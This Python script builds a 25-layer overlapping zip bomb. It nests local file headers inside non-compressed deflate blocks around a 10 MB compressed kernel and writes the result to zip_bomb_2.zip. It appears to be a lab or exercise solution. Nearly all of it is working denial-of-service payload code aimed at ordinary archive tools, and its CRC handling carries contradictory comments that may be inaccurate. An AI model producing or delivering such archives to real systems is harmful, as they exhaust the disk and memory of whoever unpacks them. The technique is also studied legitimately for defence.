# add to path the shared functions
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from shared.commons import *

# Creates a zip bomb with n layers
# Param: number of layers
def create_zip_bomb(number_of_layers):
    uncompressed_data = b"A"*10000000
    # file1.txt should contain uncompressed_data when unzipped.
    # prepare the zip binary content in zip_file_data

    # compress the kernel once
    compressed_data, comp_size, uncomp_size = compress_data(uncompressed_data)
    crc = zlib.crc32(uncompressed_data) & 0xffffffff

    # build local file headers from innermost (file1) outwards
    # each layer wraps the previous LFH with a non-compressed block
    filenames = []
    lfhs = []
    crcs = []
    comp_sizes = []
    uncomp_sizes = []

    # innermost layer (file1.txt) - points directly to the kernel
    filenames.append("file1.txt")
    lfh1 = create_lfh("file1.txt", comp_size, uncomp_size, crc)
    lfhs.append(lfh1)
    crcs.append(crc)
    comp_sizes.append(comp_size)
    uncomp_sizes.append(uncomp_size)

    # build each additional layer on top
    for i in range(2, number_of_layers + 1):
        prev_lfh = lfhs[-1]
        ncb = create_non_compressed_block(len(prev_lfh))

        layer_comp_size = len(ncb) + len(prev_lfh) + comp_sizes[-1]
        layer_uncomp_size = len(prev_lfh) + uncomp_sizes[-1]

        # CRC needs to cover: prev_lfh bytes (raw) + everything the prev layer decompresses to
        # but easier to just track the full uncompressed content
        # the decompressed output grows by prepending the prev LFH each time
        # so we compute CRC incrementally
        layer_crc = zlib.crc32(prev_lfh + uncompressed_data) & 0xffffffff
        # for layers beyond 2, the uncompressed content includes all the nested LFH bytes
        # but actually each layer only adds one prev_lfh to the front of the decompressed stream
        # so we need to build the full prefix
        if i > 2:
            prefix = bytearray()
            for j in range(i-1, 0, -1):
                prefix.extend(lfhs[j-1])
            layer_crc = zlib.crc32(bytes(prefix) + uncompressed_data) & 0xffffffff
            layer_uncomp_size = len(prefix) + uncomp_size

        fname = f"file{i}.txt"
        filenames.append(fname)
        lfh_i = create_lfh(fname, layer_comp_size, layer_uncomp_size, layer_crc)
        lfhs.append(lfh_i)
        crcs.append(layer_crc)
        comp_sizes.append(layer_comp_size)
        uncomp_sizes.append(layer_uncomp_size)

    # now assemble the zip file data
    # layout: outermost LFH, then ncb+LFH pairs going inward, then compressed kernel
    zip_file_data = bytearray()

    # track where each LFH starts
    lfh_offsets = [0] * number_of_layers

    # write from outermost to innermost
    # outermost layer is the last in our lists
    for i in range(number_of_layers - 1, -1, -1):
        lfh_offsets[i] = len(zip_file_data)
        zip_file_data.extend(lfhs[i])
        # add non-compressed block between layers (except after the innermost)
        if i > 0:
            ncb = create_non_compressed_block(len(lfhs[i-1]))
            zip_file_data.extend(ncb)

    # append the compressed kernel
    zip_file_data.extend(compressed_data)

    # central directory
    central_dir = bytearray()
    cd_offset = len(zip_file_data)

    for i in range(number_of_layers):
        cdh = create_cdh(filenames[i], crcs[i], comp_sizes[i], uncomp_sizes[i], lfh_offsets[i])
        central_dir.extend(cdh)

    zip_file_data.extend(central_dir)

    # end of central directory
    eocd = create_eocd(len(central_dir), cd_offset, number_of_layers)
    zip_file_data.extend(eocd)

    with open("zip_bomb_2.zip", "wb") as f:
        f.write(zip_file_data)

if __name__ == "__main__":
    zip_bomb_data = create_zip_bomb(25)
